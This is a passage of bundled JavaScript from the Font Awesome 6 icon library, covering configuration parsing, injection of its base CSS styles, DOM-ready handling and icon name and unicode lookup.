  var ATTRIBUTES_WATCHED_FOR_MUTATION = ["class", "data-prefix", "data-icon", "data-fa-transform", "data-fa-mask"];
  var DUOTONE_CLASSES = t$1;
  var prefixes = /* @__PURE__ */ new Set();
  Object.keys(STYLE_TO_PREFIX[a]).map(prefixes.add.bind(prefixes));
  Object.keys(STYLE_TO_PREFIX[r]).map(prefixes.add.bind(prefixes));
  Object.keys(STYLE_TO_PREFIX[o]).map(prefixes.add.bind(prefixes));
  var RESERVED_CLASSES = [...Ct, ...yo];
  var initial = WINDOW.FontAwesomeConfig || {};
  function getAttrConfig(attr) {
    var element = DOCUMENT.querySelector("script[" + attr + "]");
    if (element) {
      return element.getAttribute(attr);
    }
  }
  function coerce(val) {
    if (val === "") return true;
    if (val === "false") return false;
    if (val === "true") return true;
    return val;
  }
  if (DOCUMENT && typeof DOCUMENT.querySelector === "function") {
    const attrs = [["data-family-prefix", "familyPrefix"], ["data-css-prefix", "cssPrefix"], ["data-family-default", "familyDefault"], ["data-style-default", "styleDefault"], ["data-replacement-class", "replacementClass"], ["data-auto-replace-svg", "autoReplaceSvg"], ["data-auto-add-css", "autoAddCss"], ["data-auto-a11y", "autoA11y"], ["data-search-pseudo-elements", "searchPseudoElements"], ["data-observe-mutations", "observeMutations"], ["data-mutate-approach", "mutateApproach"], ["data-keep-original-source", "keepOriginalSource"], ["data-measure-performance", "measurePerformance"], ["data-show-missing-icons", "showMissingIcons"]];
    attrs.forEach((_ref) => {
      let [attr, key] = _ref;
      const val = coerce(getAttrConfig(attr));
      if (val !== void 0 && val !== null) {
        initial[key] = val;
      }
    });
  }
  var _default = {
    styleDefault: "solid",
    familyDefault: "classic",
    cssPrefix: DEFAULT_CSS_PREFIX,
    replacementClass: DEFAULT_REPLACEMENT_CLASS,
    autoReplaceSvg: true,
    autoAddCss: true,
    autoA11y: true,
    searchPseudoElements: false,
    observeMutations: true,
    mutateApproach: "async",
    keepOriginalSource: true,
    measurePerformance: false,
    showMissingIcons: true
  };
  if (initial.familyPrefix) {
    initial.cssPrefix = initial.familyPrefix;
  }
  var _config = {
    ..._default,
    ...initial
  };
  if (!_config.autoReplaceSvg) _config.observeMutations = false;
  var config = {};
  Object.keys(_default).forEach((key) => {
    Object.defineProperty(config, key, {
      enumerable: true,
      set: function(val) {
        _config[key] = val;
        _onChangeCb.forEach((cb) => cb(config));
      },
      get: function() {
        return _config[key];
      }
    });
  });
  Object.defineProperty(config, "familyPrefix", {
    enumerable: true,
    set: function(val) {
      _config.cssPrefix = val;
      _onChangeCb.forEach((cb) => cb(config));
    },
    get: function() {
      return _config.cssPrefix;
    }
  });
  WINDOW.FontAwesomeConfig = config;
  var _onChangeCb = [];
  function onChange(cb) {
    _onChangeCb.push(cb);
    return () => {
      _onChangeCb.splice(_onChangeCb.indexOf(cb), 1);
    };
  }
  var d$2 = UNITS_IN_GRID;
  var meaninglessTransform = {
    size: 16,
    x: 0,
    y: 0,
    rotate: 0,
    flipX: false,
    flipY: false
  };
  function insertCss(css2) {
    if (!css2 || !IS_DOM) {
      return;
    }
    const style = DOCUMENT.createElement("style");
    style.setAttribute("type", "text/css");
    style.innerHTML = css2;
    const headChildren = DOCUMENT.head.childNodes;
    let beforeChild = null;
    for (let i = headChildren.length - 1; i > -1; i--) {
      const child = headChildren[i];
      const tagName = (child.tagName || "").toUpperCase();
      if (["STYLE", "LINK"].indexOf(tagName) > -1) {
        beforeChild = child;
      }
    }
    DOCUMENT.head.insertBefore(style, beforeChild);
    return css2;
  }
  var idPool = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  function nextUniqueId() {
    let size2 = 12;
    let id = "";
    while (size2-- > 0) {
      id += idPool[Math.random() * 62 | 0];
    }
    return id;
  }
  function toArray2(obj) {
    const array = [];
    for (let i = (obj || []).length >>> 0; i--; ) {
      array[i] = obj[i];
    }
    return array;
  }
  function classArray(node) {
    if (node.classList) {
      return toArray2(node.classList);
    } else {
      return (node.getAttribute("class") || "").split(" ").filter((i) => i);
    }
  }
  function htmlEscape(str2) {
    return "".concat(str2).replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/'/g, "&#39;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  }
  function joinAttributes(attributes) {
    return Object.keys(attributes || {}).reduce((acc, attributeName) => {
      return acc + "".concat(attributeName, '="').concat(htmlEscape(attributes[attributeName]), '" ');
    }, "").trim();
  }
  function joinStyles(styles2) {
    return Object.keys(styles2 || {}).reduce((acc, styleName) => {
      return acc + "".concat(styleName, ": ").concat(styles2[styleName].trim(), ";");
    }, "");
  }
  function transformIsMeaningful(transform) {
    return transform.size !== meaninglessTransform.size || transform.x !== meaninglessTransform.x || transform.y !== meaninglessTransform.y || transform.rotate !== meaninglessTransform.rotate || transform.flipX || transform.flipY;
  }
  function transformForSvg(_ref) {
    let {
      transform,
      containerWidth,
      iconWidth
    } = _ref;
    const outer = {
      transform: "translate(".concat(containerWidth / 2, " 256)")
    };
    const innerTranslate = "translate(".concat(transform.x * 32, ", ").concat(transform.y * 32, ") ");
    const innerScale = "scale(".concat(transform.size / 16 * (transform.flipX ? -1 : 1), ", ").concat(transform.size / 16 * (transform.flipY ? -1 : 1), ") ");
    const innerRotate = "rotate(".concat(transform.rotate, " 0 0)");
    const inner = {
      transform: "".concat(innerTranslate, " ").concat(innerScale, " ").concat(innerRotate)
    };
    const path = {
      transform: "translate(".concat(iconWidth / 2 * -1, " -256)")
    };
    return {
      outer,
      inner,
      path
    };
  }
  function transformForCss(_ref2) {
    let {
      transform,
      width = UNITS_IN_GRID,
      height = UNITS_IN_GRID,
      startCentered = false
    } = _ref2;
    let val = "";
    if (startCentered && IS_IE) {
      val += "translate(".concat(transform.x / d$2 - width / 2, "em, ").concat(transform.y / d$2 - height / 2, "em) ");
    } else if (startCentered) {
      val += "translate(calc(-50% + ".concat(transform.x / d$2, "em), calc(-50% + ").concat(transform.y / d$2, "em)) ");
    } else {
      val += "translate(".concat(transform.x / d$2, "em, ").concat(transform.y / d$2, "em) ");
    }
    val += "scale(".concat(transform.size / d$2 * (transform.flipX ? -1 : 1), ", ").concat(transform.size / d$2 * (transform.flipY ? -1 : 1), ") ");
    val += "rotate(".concat(transform.rotate, "deg) ");
    return val;
  }
  var baseStyles = ':root, :host {\n  --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Free";\n  --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Free";\n  --fa-font-light: normal 300 1em/1 "Font Awesome 6 Pro";\n  --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Pro";\n  --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";\n  --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";\n  --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";\n  --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp";\n  --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp";\n  --fa-font-sharp-thin: normal 100 1em/1 "Font Awesome 6 Sharp";\n  --fa-font-sharp-duotone-solid: normal 900 1em/1 "Font Awesome 6 Sharp Duotone";\n}\n\nsvg:not(:root).svg-inline--fa, svg:not(:host).svg-inline--fa {\n  overflow: visible;\n  box-sizing: content-box;\n}\n\n.svg-inline--fa {\n  display: var(--fa-display, inline-block);\n  height: 1em;\n  overflow: visible;\n  vertical-align: -0.125em;\n}\n.svg-inline--fa.fa-2xs {\n  vertical-align: 0.1em;\n}\n.svg-inline--fa.fa-xs {\n  vertical-align: 0em;\n}\n.svg-inline--fa.fa-sm {\n  vertical-align: -0.0714285705em;\n}\n.svg-inline--fa.fa-lg {\n  vertical-align: -0.2em;\n}\n.svg-inline--fa.fa-xl {\n  vertical-align: -0.25em;\n}\n.svg-inline--fa.fa-2xl {\n  vertical-align: -0.3125em;\n}\n.svg-inline--fa.fa-pull-left {\n  margin-right: var(--fa-pull-margin, 0.3em);\n  width: auto;\n}\n.svg-inline--fa.fa-pull-right {\n  margin-left: var(--fa-pull-margin, 0.3em);\n  width: auto;\n}\n.svg-inline--fa.fa-li {\n  width: var(--fa-li-width, 2em);\n  top: 0.25em;\n}\n.svg-inline--fa.fa-fw {\n  width: var(--fa-fw-width, 1.25em);\n}\n\n.fa-layers svg.svg-inline--fa {\n  bottom: 0;\n  left: 0;\n  margin: auto;\n  position: absolute;\n  right: 0;\n  top: 0;\n}\n\n.fa-layers-counter, .fa-layers-text {\n  display: inline-block;\n  position: absolute;\n  text-align: center;\n}\n\n.fa-layers {\n  display: inline-block;\n  height: 1em;\n  position: relative;\n  text-align: center;\n  vertical-align: -0.125em;\n  width: 1em;\n}\n.fa-layers svg.svg-inline--fa {\n  transform-origin: center center;\n}\n\n.fa-layers-text {\n  left: 50%;\n  top: 50%;\n  transform: translate(-50%, -50%);\n  transform-origin: center center;\n}\n\n.fa-layers-counter {\n  background-color: var(--fa-counter-background-color, #ff253a);\n  border-radius: var(--fa-counter-border-radius, 1em);\n  box-sizing: border-box;\n  color: var(--fa-inverse, #fff);\n  line-height: var(--fa-counter-line-height, 1);\n  max-width: var(--fa-counter-max-width, 5em);\n  min-width: var(--fa-counter-min-width, 1.5em);\n  overflow: hidden;\n  padding: var(--fa-counter-padding, 0.25em 0.5em);\n  right: var(--fa-right, 0);\n  text-overflow: ellipsis;\n  top: var(--fa-top, 0);\n  transform: scale(var(--fa-counter-scale, 0.25));\n  transform-origin: top right;\n}\n\n.fa-layers-bottom-right {\n  bottom: var(--fa-bottom, 0);\n  right: var(--fa-right, 0);\n  top: auto;\n  transform: scale(var(--fa-layers-scale, 0.25));\n  transform-origin: bottom right;\n}\n\n.fa-layers-bottom-left {\n  bottom: var(--fa-bottom, 0);\n  left: var(--fa-left, 0);\n  right: auto;\n  top: auto;\n  transform: scale(var(--fa-layers-scale, 0.25));\n  transform-origin: bottom left;\n}\n\n.fa-layers-top-right {\n  top: var(--fa-top, 0);\n  right: var(--fa-right, 0);\n  transform: scale(var(--fa-layers-scale, 0.25));\n  transform-origin: top right;\n}\n\n.fa-layers-top-left {\n  left: var(--fa-left, 0);\n  right: auto;\n  top: var(--fa-top, 0);\n  transform: scale(var(--fa-layers-scale, 0.25));\n  transform-origin: top left;\n}\n\n.fa-1x {\n  font-size: 1em;\n}\n\n.fa-2x {\n  font-size: 2em;\n}\n\n.fa-3x {\n  font-size: 3em;\n}\n\n.fa-4x {\n  font-size: 4em;\n}\n\n.fa-5x {\n  font-size: 5em;\n}\n\n.fa-6x {\n  font-size: 6em;\n}\n\n.fa-7x {\n  font-size: 7em;\n}\n\n.fa-8x {\n  font-size: 8em;\n}\n\n.fa-9x {\n  font-size: 9em;\n}\n\n.fa-10x {\n  font-size: 10em;\n}\n\n.fa-2xs {\n  font-size: 0.625em;\n  line-height: 0.1em;\n  vertical-align: 0.225em;\n}\n\n.fa-xs {\n  font-size: 0.75em;\n  line-height: 0.0833333337em;\n  vertical-align: 0.125em;\n}\n\n.fa-sm {\n  font-size: 0.875em;\n  line-height: 0.0714285718em;\n  vertical-align: 0.0535714295em;\n}\n\n.fa-lg {\n  font-size: 1.25em;\n  line-height: 0.05em;\n  vertical-align: -0.075em;\n}\n\n.fa-xl {\n  font-size: 1.5em;\n  line-height: 0.0416666682em;\n  vertical-align: -0.125em;\n}\n\n.fa-2xl {\n  font-size: 2em;\n  line-height: 0.03125em;\n  vertical-align: -0.1875em;\n}\n\n.fa-fw {\n  text-align: center;\n  width: 1.25em;\n}\n\n.fa-ul {\n  list-style-type: none;\n  margin-left: var(--fa-li-margin, 2.5em);\n  padding-left: 0;\n}\n.fa-ul > li {\n  position: relative;\n}\n\n.fa-li {\n  left: calc(-1 * var(--fa-li-width, 2em));\n  position: absolute;\n  text-align: center;\n  width: var(--fa-li-width, 2em);\n  line-height: inherit;\n}\n\n.fa-border {\n  border-color: var(--fa-border-color, #eee);\n  border-radius: var(--fa-border-radius, 0.1em);\n  border-style: var(--fa-border-style, solid);\n  border-width: var(--fa-border-width, 0.08em);\n  padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);\n}\n\n.fa-pull-left {\n  float: left;\n  margin-right: var(--fa-pull-margin, 0.3em);\n}\n\n.fa-pull-right {\n  float: right;\n  margin-left: var(--fa-pull-margin, 0.3em);\n}\n\n.fa-beat {\n  animation-name: fa-beat;\n  animation-delay: var(--fa-animation-delay, 0s);\n  animation-direction: var(--fa-animation-direction, normal);\n  animation-duration: var(--fa-animation-duration, 1s);\n  animation-iteration-count: var(--fa-animation-iteration-count, infinite);\n  animation-timing-function: var(--fa-animation-timing, ease-in-out);\n}\n\n.fa-bounce {\n  animation-name: fa-bounce;\n  animation-delay: var(--fa-animation-delay, 0s);\n  animation-direction: var(--fa-animation-direction, normal);\n  animation-duration: var(--fa-animation-duration, 1s);\n  animation-iteration-count: var(--fa-animation-iteration-count, infinite);\n  animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));\n}\n\n.fa-fade {\n  animation-name: fa-fade;\n  animation-delay: var(--fa-animation-delay, 0s);\n  animation-direction: var(--fa-animation-direction, normal);\n  animation-duration: var(--fa-animation-duration, 1s);\n  animation-iteration-count: var(--fa-animation-iteration-count, infinite);\n  animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));\n}\n\n.fa-beat-fade {\n  animation-name: fa-beat-fade;\n  animation-delay: var(--fa-animation-delay, 0s);\n  animation-direction: var(--fa-animation-direction, normal);\n  animation-duration: var(--fa-animation-duration, 1s);\n  animation-iteration-count: var(--fa-animation-iteration-count, infinite);\n  animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));\n}\n\n.fa-flip {\n  animation-name: fa-flip;\n  animation-delay: var(--fa-animation-delay, 0s);\n  animation-direction: var(--fa-animation-direction, normal);\n  animation-duration: var(--fa-animation-duration, 1s);\n  animation-iteration-count: var(--fa-animation-iteration-count, infinite);\n  animation-timing-function: var(--fa-animation-timing, ease-in-out);\n}\n\n.fa-shake {\n  animation-name: fa-shake;\n  animation-delay: var(--fa-animation-delay, 0s);\n  animation-direction: var(--fa-animation-direction, normal);\n  animation-duration: var(--fa-animation-duration, 1s);\n  animation-iteration-count: var(--fa-animation-iteration-count, infinite);\n  animation-timing-function: var(--fa-animation-timing, linear);\n}\n\n.fa-spin {\n  animation-name: fa-spin;\n  animation-delay: var(--fa-animation-delay, 0s);\n  animation-direction: var(--fa-animation-direction, normal);\n  animation-duration: var(--fa-animation-duration, 2s);\n  animation-iteration-count: var(--fa-animation-iteration-count, infinite);\n  animation-timing-function: var(--fa-animation-timing, linear);\n}\n\n.fa-spin-reverse {\n  --fa-animation-direction: reverse;\n}\n\n.fa-pulse,\n.fa-spin-pulse {\n  animation-name: fa-spin;\n  animation-direction: var(--fa-animation-direction, normal);\n  animation-duration: var(--fa-animation-duration, 1s);\n  animation-iteration-count: var(--fa-animation-iteration-count, infinite);\n  animation-timing-function: var(--fa-animation-timing, steps(8));\n}\n\n@media (prefers-reduced-motion: reduce) {\n  .fa-beat,\n.fa-bounce,\n.fa-fade,\n.fa-beat-fade,\n.fa-flip,\n.fa-pulse,\n.fa-shake,\n.fa-spin,\n.fa-spin-pulse {\n    animation-delay: -1ms;\n    animation-duration: 1ms;\n    animation-iteration-count: 1;\n    transition-delay: 0s;\n    transition-duration: 0s;\n  }\n}\n@keyframes fa-beat {\n  0%, 90% {\n    transform: scale(1);\n  }\n  45% {\n    transform: scale(var(--fa-beat-scale, 1.25));\n  }\n}\n@keyframes fa-bounce {\n  0% {\n    transform: scale(1, 1) translateY(0);\n  }\n  10% {\n    transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);\n  }\n  30% {\n    transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));\n  }\n  50% {\n    transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);\n  }\n  57% {\n    transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));\n  }\n  64% {\n    transform: scale(1, 1) translateY(0);\n  }\n  100% {\n    transform: scale(1, 1) translateY(0);\n  }\n}\n@keyframes fa-fade {\n  50% {\n    opacity: var(--fa-fade-opacity, 0.4);\n  }\n}\n@keyframes fa-beat-fade {\n  0%, 100% {\n    opacity: var(--fa-beat-fade-opacity, 0.4);\n    transform: scale(1);\n  }\n  50% {\n    opacity: 1;\n    transform: scale(var(--fa-beat-fade-scale, 1.125));\n  }\n}\n@keyframes fa-flip {\n  50% {\n    transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));\n  }\n}\n@keyframes fa-shake {\n  0% {\n    transform: rotate(-15deg);\n  }\n  4% {\n    transform: rotate(15deg);\n  }\n  8%, 24% {\n    transform: rotate(-18deg);\n  }\n  12%, 28% {\n    transform: rotate(18deg);\n  }\n  16% {\n    transform: rotate(-22deg);\n  }\n  20% {\n    transform: rotate(22deg);\n  }\n  32% {\n    transform: rotate(-12deg);\n  }\n  36% {\n    transform: rotate(12deg);\n  }\n  40%, 100% {\n    transform: rotate(0deg);\n  }\n}\n@keyframes fa-spin {\n  0% {\n    transform: rotate(0deg);\n  }\n  100% {\n    transform: rotate(360deg);\n  }\n}\n.fa-rotate-90 {\n  transform: rotate(90deg);\n}\n\n.fa-rotate-180 {\n  transform: rotate(180deg);\n}\n\n.fa-rotate-270 {\n  transform: rotate(270deg);\n}\n\n.fa-flip-horizontal {\n  transform: scale(-1, 1);\n}\n\n.fa-flip-vertical {\n  transform: scale(1, -1);\n}\n\n.fa-flip-both,\n.fa-flip-horizontal.fa-flip-vertical {\n  transform: scale(-1, -1);\n}\n\n.fa-rotate-by {\n  transform: rotate(var(--fa-rotate-angle, 0));\n}\n\n.fa-stack {\n  display: inline-block;\n  vertical-align: middle;\n  height: 2em;\n  position: relative;\n  width: 2.5em;\n}\n\n.fa-stack-1x,\n.fa-stack-2x {\n  bottom: 0;\n  left: 0;\n  margin: auto;\n  position: absolute;\n  right: 0;\n  top: 0;\n  z-index: var(--fa-stack-z-index, auto);\n}\n\n.svg-inline--fa.fa-stack-1x {\n  height: 1em;\n  width: 1.25em;\n}\n.svg-inline--fa.fa-stack-2x {\n  height: 2em;\n  width: 2.5em;\n}\n\n.fa-inverse {\n  color: var(--fa-inverse, #fff);\n}\n\n.sr-only,\n.fa-sr-only {\n  position: absolute;\n  width: 1px;\n  height: 1px;\n  padding: 0;\n  margin: -1px;\n  overflow: hidden;\n  clip: rect(0, 0, 0, 0);\n  white-space: nowrap;\n  border-width: 0;\n}\n\n.sr-only-focusable:not(:focus),\n.fa-sr-only-focusable:not(:focus) {\n  position: absolute;\n  width: 1px;\n  height: 1px;\n  padding: 0;\n  margin: -1px;\n  overflow: hidden;\n  clip: rect(0, 0, 0, 0);\n  white-space: nowrap;\n  border-width: 0;\n}\n\n.svg-inline--fa .fa-primary {\n  fill: var(--fa-primary-color, currentColor);\n  opacity: var(--fa-primary-opacity, 1);\n}\n\n.svg-inline--fa .fa-secondary {\n  fill: var(--fa-secondary-color, currentColor);\n  opacity: var(--fa-secondary-opacity, 0.4);\n}\n\n.svg-inline--fa.fa-swap-opacity .fa-primary {\n  opacity: var(--fa-secondary-opacity, 0.4);\n}\n\n.svg-inline--fa.fa-swap-opacity .fa-secondary {\n  opacity: var(--fa-primary-opacity, 1);\n}\n\n.svg-inline--fa mask .fa-primary,\n.svg-inline--fa mask .fa-secondary {\n  fill: black;\n}\n\n.fad.fa-inverse,\n.fa-duotone.fa-inverse {\n  color: var(--fa-inverse, #fff);\n}';
  function css() {
    const dcp = DEFAULT_CSS_PREFIX;
    const drc = DEFAULT_REPLACEMENT_CLASS;
    const fp = config.cssPrefix;
    const rc = config.replacementClass;
    let s = baseStyles;
    if (fp !== dcp || rc !== drc) {
      const dPatt = new RegExp("\\.".concat(dcp, "\\-"), "g");
      const customPropPatt = new RegExp("\\--".concat(dcp, "\\-"), "g");
      const rPatt = new RegExp("\\.".concat(drc), "g");
      s = s.replace(dPatt, ".".concat(fp, "-")).replace(customPropPatt, "--".concat(fp, "-")).replace(rPatt, ".".concat(rc));
    }
    return s;
  }
  var _cssInserted = false;
  function ensureCss() {
    if (config.autoAddCss && !_cssInserted) {
      insertCss(css());
      _cssInserted = true;
    }
  }
  var InjectCSS = {
    mixout() {
      return {
        dom: {
          css,
          insertCss: ensureCss
        }
      };
    },
    hooks() {
      return {
        beforeDOMElementCreation() {
          ensureCss();
        },
        beforeI2svg() {
          ensureCss();
        }
      };
    }
  };
  var w$1 = WINDOW || {};
  if (!w$1[NAMESPACE_IDENTIFIER]) w$1[NAMESPACE_IDENTIFIER] = {};
  if (!w$1[NAMESPACE_IDENTIFIER].styles) w$1[NAMESPACE_IDENTIFIER].styles = {};
  if (!w$1[NAMESPACE_IDENTIFIER].hooks) w$1[NAMESPACE_IDENTIFIER].hooks = {};
  if (!w$1[NAMESPACE_IDENTIFIER].shims) w$1[NAMESPACE_IDENTIFIER].shims = [];
  var namespace = w$1[NAMESPACE_IDENTIFIER];
  var functions = [];
  var listener = function() {
    DOCUMENT.removeEventListener("DOMContentLoaded", listener);
    loaded = 1;
    functions.map((fn) => fn());
  };
  var loaded = false;
  if (IS_DOM) {
    loaded = (DOCUMENT.documentElement.doScroll ? /^loaded|^c/ : /^loaded|^i|^c/).test(DOCUMENT.readyState);
    if (!loaded) DOCUMENT.addEventListener("DOMContentLoaded", listener);
  }
  function domready(fn) {
    if (!IS_DOM) return;
    loaded ? setTimeout(fn, 0) : functions.push(fn);
  }
  function toHtml(abstractNodes) {
    const {
      tag,
      attributes = {},
      children = []
    } = abstractNodes;
    if (typeof abstractNodes === "string") {
      return htmlEscape(abstractNodes);
    } else {
      return "<".concat(tag, " ").concat(joinAttributes(attributes), ">").concat(children.map(toHtml).join(""), "</").concat(tag, ">");
    }
  }
  function iconFromMapping(mapping, prefix2, iconName) {
    if (mapping && mapping[prefix2] && mapping[prefix2][iconName]) {
      return {
        prefix: prefix2,
        iconName,
        icon: mapping[prefix2][iconName]
      };
    }
  }
  var bindInternal4 = function bindInternal42(func, thisContext) {
    return function(a2, b, c2, d) {
      return func.call(thisContext, a2, b, c2, d);
    };
  };
  var reduce = function fastReduceObject(subject, fn, initialValue, thisContext) {
    var keys = Object.keys(subject), length = keys.length, iterator = thisContext !== void 0 ? bindInternal4(fn, thisContext) : fn, i, key, result;
    if (initialValue === void 0) {
      i = 1;
      result = subject[keys[0]];
    } else {
      i = 0;
      result = initialValue;
    }
    for (; i < length; i++) {
      key = keys[i];
      result = iterator(result, subject[key], key, subject);
    }
    return result;
  };
  function ucs2decode(string) {
    const output = [];
    let counter2 = 0;
    const length = string.length;
    while (counter2 < length) {
      const value = string.charCodeAt(counter2++);
      if (value >= 55296 && value <= 56319 && counter2 < length) {
        const extra = string.charCodeAt(counter2++);
        if ((extra & 64512) == 56320) {
          output.push(((value & 1023) << 10) + (extra & 1023) + 65536);
        } else {
          output.push(value);
          counter2--;
        }
      } else {
        output.push(value);
      }
    }
    return output;
  }
  function toHex(unicode) {
    const decoded = ucs2decode(unicode);
    return decoded.length === 1 ? decoded[0].toString(16) : null;
  }
  function codePointAt(string, index) {
    const size2 = string.length;
    let first = string.charCodeAt(index);
    let second;
    if (first >= 55296 && first <= 56319 && size2 > index + 1) {
      second = string.charCodeAt(index + 1);
      if (second >= 56320 && second <= 57343) {
        return (first - 55296) * 1024 + second - 56320 + 65536;
      }
    }
    return first;
  }
  function normalizeIcons(icons) {
    return Object.keys(icons).reduce((acc, iconName) => {
      const icon2 = icons[iconName];
      const expanded = !!icon2.icon;
      if (expanded) {
        acc[icon2.iconName] = icon2.icon;
      } else {
        acc[iconName] = icon2;
      }
      return acc;
    }, {});
  }
  function defineIcons(prefix2, icons) {
    let params = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : {};
    const {
      skipHooks = false
    } = params;
    const normalized = normalizeIcons(icons);
    if (typeof namespace.hooks.addPack === "function" && !skipHooks) {
      namespace.hooks.addPack(prefix2, normalizeIcons(icons));
    } else {
      namespace.styles[prefix2] = {
        ...namespace.styles[prefix2] || {},
        ...normalized
      };
    }
    if (prefix2 === "fas") {
      defineIcons("fa", icons);
    }
  }
  var {
    styles,
    shims
  } = namespace;
  var LONG_STYLE = {
    [a]: Object.values(PREFIX_TO_LONG_STYLE[a]),
    [r]: Object.values(PREFIX_TO_LONG_STYLE[r]),
    [o]: Object.values(PREFIX_TO_LONG_STYLE[o])
  };
  var _defaultUsablePrefix = null;
  var _byUnicode = {};
  var _byLigature = {};
  var _byOldName = {};
  var _byOldUnicode = {};
  var _byAlias = {};
  var PREFIXES = {
    [a]: Object.keys(PREFIX_TO_STYLE[a]),
    [r]: Object.keys(PREFIX_TO_STYLE[r]),
    [o]: Object.keys(PREFIX_TO_STYLE[o])
  };
  function isReserved(name) {
    return ~RESERVED_CLASSES.indexOf(name);
  }
  function getIconName(cssPrefix, cls) {
    const parts = cls.split("-");
    const prefix2 = parts[0];
    const iconName = parts.slice(1).join("-");
    if (prefix2 === cssPrefix && iconName !== "" && !isReserved(iconName)) {
      return iconName;
    } else {
      return null;
    }
  }
  var build = () => {
    const lookup = (reducer) => {
      return reduce(styles, (o$$1, style, prefix2) => {
        o$$1[prefix2] = reduce(style, reducer, {});
        return o$$1;
      }, {});
    };
    _byUnicode = lookup((acc, icon2, iconName) => {
      if (icon2[3]) {
        acc[icon2[3]] = iconName;
      }
      if (icon2[2]) {
        const aliases = icon2[2].filter((a$$1) => {
          return typeof a$$1 === "number";
        });
        aliases.forEach((alias) => {
          acc[alias.toString(16)] = iconName;
        });
      }
      return acc;
    });
    _byLigature = lookup((acc, icon2, iconName) => {
      acc[iconName] = iconName;
      if (icon2[2]) {
        const aliases = icon2[2].filter((a$$1) => {
          return typeof a$$1 === "string";
        });
        aliases.forEach((alias) => {
          acc[alias] = iconName;
        });
      }
      return acc;
    });
    _byAlias = lookup((acc, icon2, iconName) => {
      const aliases = icon2[2];
      acc[iconName] = iconName;
      aliases.forEach((alias) => {
        acc[alias] = iconName;
      });
      return acc;
    });
    const hasRegular = "far" in styles || config.autoFetchSvg;
    const shimLookups = reduce(shims, (acc, shim) => {
      const maybeNameMaybeUnicode = shim[0];
      let prefix2 = shim[1];
      const iconName = shim[2];
      if (prefix2 === "far" && !hasRegular) {
        prefix2 = "fas";
      }
      if (typeof maybeNameMaybeUnicode === "string") {
        acc.names[maybeNameMaybeUnicode] = {
          prefix: prefix2,
          iconName
        };
      }
      if (typeof maybeNameMaybeUnicode === "number") {
        acc.unicodes[maybeNameMaybeUnicode.toString(16)] = {
          prefix: prefix2,
          iconName
        };
      }
      return acc;
    }, {
      names: {},
      unicodes: {}
    });
    _byOldName = shimLookups.names;
    _byOldUnicode = shimLookups.unicodes;
    _defaultUsablePrefix = getCanonicalPrefix(config.styleDefault, {
      family: config.familyDefault
    });
  };
  onChange((c$$1) => {
    _defaultUsablePrefix = getCanonicalPrefix(c$$1.styleDefault, {
      family: config.familyDefault
    });
  });
  build();
  function byUnicode(prefix2, unicode) {
    return (_byUnicode[prefix2] || {})[unicode];
  }
  function byLigature(prefix2, ligature) {
    return (_byLigature[prefix2] || {})[ligature];
  }
  function byAlias(prefix2, alias) {
    return (_byAlias[prefix2] || {})[alias];
  }
  function byOldName(name) {
    return _byOldName[name] || {
      prefix: null,
      iconName: null
    };
  }
  function byOldUnicode(unicode) {
    const oldUnicode = _byOldUnicode[unicode];
    const newUnicode = byUnicode("fas", unicode);
    return oldUnicode || (newUnicode ? {
      prefix: "fas",
      iconName: newUnicode
    } : null) || {
      prefix: null,
      iconName: null
    };
  }
  function getDefaultUsablePrefix() {
    return _defaultUsablePrefix;
  }
  var emptyCanonicalIcon = () => {
    return {
      prefix: null,
      iconName: null,
      rest: []
    };
  };
  function getCanonicalPrefix(styleOrPrefix) {
    let params = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    const {
      family = a
    } = params;
    const style = PREFIX_TO_STYLE[family][styleOrPrefix];
    const prefix2 = STYLE_TO_PREFIX[family][styleOrPrefix] || STYLE_TO_PREFIX[family][style];
    const defined = styleOrPrefix in namespace.styles ? styleOrPrefix : null;
    const result = prefix2 || defined || null;
    return result;
  }
  var PREFIXES_FOR_FAMILY = {
    [a]: Object.keys(PREFIX_TO_LONG_STYLE[a]),
    [r]: Object.keys(PREFIX_TO_LONG_STYLE[r]),
    [o]: Object.keys(PREFIX_TO_LONG_STYLE[o])
  };
  function getCanonicalIcon(values) {
    let params = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    const {
      skipLookups = false
    } = params;
    const famProps = {
      [a]: "".concat(config.cssPrefix, "-").concat(a),
      [r]: "".concat(config.cssPrefix, "-").concat(r),
      [o]: "".concat(config.cssPrefix, "-").concat(o)
    };
    let givenPrefix = null;
    let family = a;
    const nonDuotoneFamilyIds = c.filter((familyId) => familyId !== t);
    nonDuotoneFamilyIds.forEach((familyId) => {
      if (values.includes(famProps[familyId]) || values.some((v$$1) => PREFIXES_FOR_FAMILY[familyId].includes(v$$1))) {
        family = familyId;
      }
    });
    const canonical = values.reduce((acc, cls) => {
      const iconName = getIconName(config.cssPrefix, cls);
      if (styles[cls]) {
        cls = LONG_STYLE[family].includes(cls) ? LONG_STYLE_TO_PREFIX[family][cls] : cls;
        givenPrefix = cls;
        acc.prefix = cls;
      } else if (PREFIXES[family].indexOf(cls) > -1) {
